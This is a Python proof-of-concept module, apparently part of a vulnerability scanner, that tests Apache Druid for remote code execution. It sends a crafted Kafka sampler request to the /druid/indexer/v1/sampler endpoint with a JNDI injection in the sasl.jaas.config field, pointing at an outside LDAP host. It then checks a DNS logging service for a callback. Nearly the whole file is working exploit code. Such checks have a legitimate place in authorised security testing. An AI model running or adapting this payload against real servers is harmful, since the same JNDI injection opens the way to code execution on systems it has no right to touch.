'''
Function:
    Apache Druid 远程代码执行
Author:
    spmonkey
Email：
    spmonkey@hscsec.cn
Blog:
    https://spmonkey.github.io/
GitHub:
    https://github.com/spmonkey/
'''
# -*- coding: utf-8 -*-
import requests
import re
import os
import sys
from urllib.parse import urlparse
from requests.packages.urllib3 import disable_warnings
disable_warnings()
path = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.append(path)
from modules.dnslog import dnslogs


class poc:
    def __init__(self, url, proxies):
        self.url = url
        self.headers = {
            'User-Agent': 'Mozilla/4.0 (Mozilla/4.0; MSIE 7.0; Windows NT 5.1; FDM; SV1; .NET CLR 3.0.04506.30)',
            'Content-Type': 'application/json'
        }
        self.result_text = ""
        self.proxies = proxies

    def host(self):
        url = urlparse(self.url)
        netloc = url.netloc
        scheme = url.scheme
        return netloc, scheme

    def vuln(self, netloc, scheme):
        dnslog_all = dnslogs().get_dnslog()
        dnslog = dnslog_all[0]
        url = "{}://{}/druid/indexer/v1/sampler?for=connect".format(scheme, netloc)
        self.data = f'''%7B
"type":"kafka",
"spec":%7B
"type":"kafka",
"ioConfig":%7B
"type":"kafka",
"consumerProperties":%7B
"bootstrap.servers":"1.1.1.1:9092",
"sasl.mechanism":"SCRAM-SHA-256",
"security.protocol":"SASL_SSL",
"sasl.jaas.config":"com.sun.security.auth.module.JndiLoginModule required user.provider.url=\"ldap://{dnslog}\" useFirstPass=\"true\" serviceName=\"x\" debug=\"true\" group.provider.url=\"xxx\";"
%7D,
"topic":"any",
"useEarliestOffset":true,
"inputFormat":%7B
"type":"regex",
"pattern":"([\\s\\S]*)",
"listDelimiter":"56616469-6de2-9da4-efb8-8f416e6e6965",
"columns":[
"raw"
]
%7D
%7D,
"dataSchema":%7B
"dataSource":"sample",
"timestampSpec":%7B
"column":"!!!_no_such_column_!!!",
"missingValue":"1970-01-01T00:00:00Z"
%7D,
"dimensionsSpec":%7B

%7D,
"granularitySpec":%7B
"rollup":false
%7D
%7D,
"tuningConfig":%7B
"type":"kafka"
%7D
%7D,
"samplerConfig":%7B
"numRows":500,
"timeoutMs":15000
%7D
%7D'''
        try:
            self.result = requests.post(url=url, data=self.data, headers=self.headers, verify=False, timeout=3, proxies=self.proxies)
            self.target = urlparse(url)
            for i in range(5):
                dnslog_result = dnslogs().get_result(dnslog_all[1])
                if dnslog_result != "[]":
                    return True
                else:
                    return False
        except:
            return False

    def main(self):
        all = self.host()
        netloc = all[0]
        scheme = all[1]
        if self.vuln(netloc, scheme):
            self.result_text += """\n        [+]    \033[32m检测到目标站点存在远程代码执行漏洞\033[0m
                 POST {} HTTP/1.1
                 Host: {}""".format(self.target.path + "?" + self.target.query, self.target.netloc)
            for request_type, request_text in dict(self.result.request.headers).items():
                self.result_text += "\n                 {}: {}".format(request_type, request_text)
            self.result_text += "\n\n                 {}".format(self.data)
            return self.result_text
        else:
            return False

